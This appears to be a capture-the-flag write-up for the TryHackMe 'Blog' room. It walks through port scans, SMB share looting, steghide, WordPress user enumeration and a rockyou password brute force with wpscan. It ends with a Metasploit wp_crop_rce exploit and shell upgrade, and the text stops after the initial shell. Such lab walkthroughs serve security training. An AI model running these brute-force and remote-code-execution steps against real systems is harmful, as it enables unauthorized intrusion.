# Blog

**Room Link:** [https://tryhackme.com/room/blog](https://tryhackme.com/room/blog)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>



## TCP/445 - SMB

**Kali**

```
smbclient -L //$VICTIM/
```

<figure><img src="../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
smbclient //$VICTIM/BillySMB
```

<figure><img src="../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
smbget -R smb://$VICTIM/BillySMB
```

<figure><img src="../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
steghide extract -sf check-this.png 
cat rabbit_hole.txt 
```

<figure><img src="../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

If you go to http://$VICTIM/wp-admin the page redirects to a new page so I add blog.thm into my hosts file and then it worked.

<figure><img src="../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wpscan --url http://blog.thm/ --enumerate u
```

<figure><img src="../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

Hydra was taking too long but wpscan was able to find it quickly.

**Kali**

```
wpscan --url http://blog.thm/ -U kwheel, bjoel -P /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

After logging in the user couldn't really do anything but I noticed wordpress is on version 5.0

<figure><img src="../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>







## Initial Shell

**Kali**

```
msfconsole
use exploit/multi/http/wp_crop_rce
set rhosts 10.10.229.10
set username kwheel
set password cutiepie1
run
shell
python -c 'import pty; pty.spawn("/bin/bash")'
id
```

<figure><img src="../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>





























